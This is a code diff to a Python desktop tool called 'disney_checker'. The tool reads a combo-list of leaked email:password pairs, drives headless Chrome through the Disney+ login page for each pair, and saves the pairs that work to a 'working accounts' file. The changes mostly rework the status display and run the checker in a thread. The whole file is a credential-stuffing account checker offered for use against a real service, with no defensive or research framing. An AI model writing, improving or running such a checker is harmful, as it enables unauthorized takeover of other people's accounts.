@@ -1,4 +1,5 @@
 import time
+import threading
 import os
 import requests
 import tkinter
@@ -16,8 +17,10 @@ from pathlib import Path
 class disney_checker():
 
 	def __init__(self, root):
-	
-		self.infobox = Text(root, bg='goldenrod3',font=('Arial',11),height = 360, width=460)
+		
+		self.information_bar = Canvas(root, bg='goldenrod3')
+		self.information_bar.place(x=58,y=238,width=681,height=38)
+		self.infobox = Text(root, bg='goldenrod3',font=('Arial',11))
 		self.file_directory = str(Path(__file__).parents[1])+'/disney'
 		self.page = 'https://www.disneyplus.com/login'
 		self.users = []
@@ -26,64 +29,59 @@ class disney_checker():
 		self.browser_options = Options()
 		self.browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')		
 		self.browser_options.headless = True
-		self.start_checker = Button(root, text = 'Start Checker',command = partial(self.check_the_accounts,root), style='GUI_Buttons.TButton')
+		self.start_checker = Button(root, text = 'Start Checker',command = self.threaded_function, style='GUI_Buttons.TButton')
 		
 	def split_combo_file(self,root):
 	
-		self.split_combos = split_combos(root)
+		self.split_combos = split_combos(root,'disney')
 		
-		
-	def draw_checker_button(self,root):
+	def draw_checker_button(self):
 			
 		self.start_checker.place(x=298,y=560)
 			
 	def draw_the_infobox(self):
-	
 		self.infobox.place(x=58,y=288,width=681,height=250)
 		
 	def split_username_and_password(self):
-		self.error_flag=False
 		try:		
 			os.makedirs('accounts',exist_ok=True)
 			with open(self.file_directory, 'r') as disney:
 				for line in disney.readlines():
 						self.users.append(line.split(':')[0].strip())
-						self.passwords.append(line.split(':')[1].strip())
-						
+						self.passwords.append(line.split(':')[1].strip())					
 		except FileNotFoundError:
-		
-			self.error_flag=True
+			self.information_bar.create_text(90,18,text = 'Error: File Not Found.',font=('Arial',12))
 			self.infobox.insert(END,"There is no combo-list present in directory.\n\nMake sure to include a combo-list for the appropriate service in:\n\n ' {} '".format(str(Path(__file__).parents[1])))
-			
+			self.infobox.config(state=DISABLED)
 		except IndexError:
-		
-			self.error_flag=True
+			self.information_bar.create_text(90,18,text = 'Parsing Error.',font=('Arial',12))
 			self.infobox.insert(END,"There is something wrong with the combolist.\n\nIt might have been split twice, have spaces included, or invalid characters")
+			self.infobox.config(state=DISABLED)
 						
 	def destroy_all_elements(self):
-	
+		
 		self.split_combos.destroy_split_button()
 		self.start_checker.destroy()
 		self.infobox.destroy()
+		self.information_bar.destroy()
 		self.split_combos.destroy_info_label()
 		
-	def check_the_accounts(self,root):	
+	def check_the_accounts(self):
+	
 		self.draw_the_infobox()
 		self.split_username_and_password()
 		self.start_checker.destroy()
 		self.split_combos.destroy_split_button()
 		self.split_combos.destroy_info_label()
-		checking_progress_label = Label(root,background='goldenrod3', text = 'Opening Browser...',font=('Arial',12))
-		if self.error_flag == False:
-			checking_progress_label.place(x=68,y=238)
 		index = 0
 		error_on_first_page = False
-		while index != len(self.users) and self.error_flag == False:
+		while index != len(self.users):
 			with open('accounts/disney_working_accounts','a') as account_results:
 				try:
 					self.infobox.insert(END,'Trying Combo {} out of {}'.format(index+1, len(self.users)))
-					checking_progress_label['text']='Opening Browser...'
-					root.update_idletasks()
+					self.information_bar.delete('all')
+					self.information_bar.create_text(90,18,text = 'Opening Browser...',font=('Arial',12))
+					self.information_bar.update_idletasks()
 					browser = webdriver.Chrome(options = self.browser_options)
 					browser.set_window_size(500,700)
 					browser.get(self.page)
@@ -91,8 +89,9 @@ class disney_checker():
 					email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
 					continue_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div[2]/button')					
 					email_input_box.send_keys(self.users[index])
-					checking_progress_label['text']='Entering Email...'
-					root.update_idletasks()
+					self.information_bar.delete('all')
+					self.information_bar.create_text(90,18,text ='Entering Email...',font=('Arial',12))
+					self.information_bar.update_idletasks()
 					if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
 						gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
 						gdpr_reject_all.click()
@@ -112,11 +111,13 @@ class disney_checker():
 						password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
 						login_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div/button')
 						password_input_box.send_keys(self.passwords[index])
-						checking_progress_label['text']='Entering Password...'
-						root.update_idletasks()
+						self.information_bar.delete('all')
+						self.information_bar.create_text(90,18,text ='Entering Password...',font=('Arial',12))
+						self.information_bar.update_idletasks()
 						login_button.click()
-						checking_progress_label['text']='Logging in...'
-						root.update_idletasks()
+						self.information_bar.delete('all')
+						self.information_bar.create_text(90,18,text ='Logging in...',font=('Arial',12))
+						self.information_bar.update_idletasks()
 						time.sleep(5)
 						if browser.find_elements_by_xpath('//*[@id="app_index"]/div[3]/div/div/h4'):
 							travelling_warning = browser.find_element_by_xpath('//*[@id="app_index"]/div[3]/div/div/h4').text
@@ -139,4 +140,6 @@ class disney_checker():
 				except Exception as e:
 					self.infobox.insert(END,'\n{}'.format(e))
 					break
-
+					
+	def threaded_function(self):	
+		threading.Thread(target=self.check_the_accounts,args=()).start()
